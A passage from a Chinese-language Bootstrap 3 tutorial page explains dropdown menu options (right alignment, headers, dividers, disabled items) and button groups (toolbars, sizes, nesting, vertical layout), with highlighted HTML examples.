class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;presentation&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;menuitem&quot;</span> <span class="hljs-attr">tabindex</span>=<span class="hljs-string">&quot;-1&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>数据通信/网络<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;presentation&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;divider&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;presentation&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;menuitem&quot;</span> <span class="hljs-attr">tabindex</span>=<span class="hljs-string">&quot;-1&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>分离的链接<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>但是，不再建议对下拉菜单使用 <code>.pull-right</code> 类。如需将菜单右对齐，请使用 <code>.dropdown-menu-right</code> 类。如需左对齐，请使用 <code>.dropdown-menu-left</code> 类。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown-menu dropdown-menu-right&quot;</span> <span class="hljs-attr">aria-labelledby</span>=<span class="hljs-string">&quot;dLabel&quot;</span>&gt;</span><br>  ...<br><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="2-2-标题"><a href="#2-2-标题" class="headerlink" title="2.2 标题"></a>2.2 标题</h3><p>可以使用 <code>.dropdown-header</code> 向下拉菜单的标签区域添加标题。</p><h3 id="2-3-分割线"><a href="#2-3-分割线" class="headerlink" title="2.3 分割线"></a>2.3 分割线</h3><p>为下拉菜单添加一条分割线，用于将多个链接分组。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;separator&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;divider&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>示例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn dropdown-toggle&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;dropdownMenu1&quot;</span> <span class="hljs-attr">data-toggle</span>=<span class="hljs-string">&quot;dropdown&quot;</span>&gt;</span>主题<br>        <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;caret&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown-menu&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;menu&quot;</span> <span class="hljs-attr">aria-labelledby</span>=<span class="hljs-string">&quot;dropdownMenu1&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;presentation&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown-header&quot;</span>&gt;</span>下拉菜单标题<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;presentation&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;menuitem&quot;</span> <span class="hljs-attr">tabindex</span>=<span class="hljs-string">&quot;-1&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Java<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;presentation&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;menuitem&quot;</span> <span class="hljs-attr">tabindex</span>=<span class="hljs-string">&quot;-1&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>数据挖掘<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;presentation&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;menuitem&quot;</span> <span class="hljs-attr">tabindex</span>=<span class="hljs-string">&quot;-1&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>数据通信/网络<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;presentation&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;divider&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span> //分割线<br>        <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;presentation&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown-header&quot;</span>&gt;</span>下拉菜单标题<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;presentation&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;menuitem&quot;</span> <span class="hljs-attr">tabindex</span>=<span class="hljs-string">&quot;-1&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>分离的链接<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="2-4-禁用的菜单项"><a href="#2-4-禁用的菜单项" class="headerlink" title="2.4 禁用的菜单项"></a>2.4 禁用的菜单项</h3><p>为下拉菜单中的 <code>&lt;li&gt;</code> 元素添加 <code>.disabled</code> 类，从而禁用相应的菜单项。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown-menu&quot;</span> <span class="hljs-attr">aria-labelledby</span>=<span class="hljs-string">&quot;dropdownMenu4&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Regular link<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;disabled&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Disabled link<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Another link<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="3-按钮组"><a href="#3-按钮组" class="headerlink" title="3.按钮组"></a>3.按钮组</h2><p>通过按钮组容器把一组按钮放在同一行里。通过与按钮的 JavaScript 插件联合使用，可以设置为单选框或多选框的样式和行为。</p><p>当为 <code>.btn-group</code> 中的元素应用工具提示或弹出框时，必须指定 <code>container: &#39;body&#39;</code> 选项，这样可以避免不必要的副作用（例如工具提示或弹出框触发时，会让页面元素变宽和/或失去圆角）。</p><p>为了向使用辅助技术 - 如屏幕阅读器 - 的用户正确传达一正确的按钮分组，需要提供一个合适的 <code>role</code> 属性。对于按钮组合，应该是 <code>role=&quot;group&quot;</code>，对于toolbar（工具栏）应该是 <code>role=&quot;toolbar&quot;</code>。使用 <code>aria-label</code>，但是， <code>aria-labelledby</code> 也可以使用。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn-group&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;group&quot;</span> <span class="hljs-attr">aria-label</span>=<span class="hljs-string">&quot;...&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default&quot;</span>&gt;</span>Left<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default&quot;</span>&gt;</span>Middle<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default&quot;</span>&gt;</span>Right<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="3-1-按钮工具栏"><a href="#3-1-按钮工具栏" class="headerlink" title="3.1 按钮工具栏"></a>3.1 按钮工具栏</h3><p>把一组 <code>&lt;div class=&quot;btn-group&quot;&gt;</code> 组合进一个 <code>&lt;div class=&quot;btn-toolbar&quot;&gt;</code> 中就可以做成更复杂的组件。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn-toolbar&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;toolbar&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn-group&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default&quot;</span>&gt;</span>按钮 1<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default&quot;</span>&gt;</span>按钮 2<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default&quot;</span>&gt;</span>按钮 3<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br> <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn-group&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default&quot;</span>&gt;</span>按钮 4<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default&quot;</span>&gt;</span>按钮 5<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default&quot;</span>&gt;</span>按钮 6<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn-group&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default&quot;</span>&gt;</span>按钮 7<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default&quot;</span>&gt;</span>按钮 8<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default&quot;</span>&gt;</span>按钮 9<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="3-2-按钮大小"><a href="#3-2-按钮大小" class="headerlink" title="3.2 按钮大小"></a>3.2 按钮大小</h3><p>只要给 <code>.btn-group</code> 加上 <code>.btn-group-*</code> 类，就省去为按钮组中的每个按钮都赋予尺寸类了，如果包含了多个按钮组时也适用。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn-group btn-group-lg&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default&quot;</span>&gt;</span>按钮 1<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default&quot;</span>&gt;</span>按钮 2<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default&quot;</span>&gt;</span>按钮 3<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn-group btn-group-sm&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default&quot;</span>&gt;</span>按钮 4<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default&quot;</span>&gt;</span>按钮 5<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default&quot;</span>&gt;</span>按钮 6<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn-group btn-group-xs&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default&quot;</span>&gt;</span>按钮 7<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default&quot;</span>&gt;</span>按钮 8<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default&quot;</span>&gt;</span>按钮 9<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="3-3-嵌套"><a href="#3-3-嵌套" class="headerlink" title="3.3 嵌套"></a>3.3 嵌套</h3><p>想要把下拉菜单混合到一系列按钮中，只须把 <code>.btn-group</code> 放入另一个 <code>.btn-group</code> 中。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn-group&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default&quot;</span>&gt;</span>按钮 1<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default&quot;</span>&gt;</span>按钮 2<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn-group&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default dropdown-toggle&quot;</span> <span class="hljs-attr">data-toggle</span>=<span class="hljs-string">&quot;dropdown&quot;</span>&gt;</span><br>        下拉<br>        <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;caret&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown-menu&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>下拉链接 1<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>下拉链接 2<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="3-4-垂直的按钮组"><a href="#3-4-垂直的按钮组" class="headerlink" title="3.4 垂直的按钮组"></a>3.4 垂直的按钮组</h3><p>可以使用类 <code>.btn-group-vertical</code> 。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn-group-vertical&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default&quot;</span>&gt;</span>按钮 1<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default&quot;</span>&gt;</span>按钮 2<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn-group-vertical&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default dropdown-toggle&quot;</span> <span class="hljs-attr">data-toggle</span>=<span class="hljs-string">&quot;dropdown&quot;</span>&gt;</span><br>        下拉<br>        <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;caret&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown-menu&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>下拉链接 1<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>下拉链接 2<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span 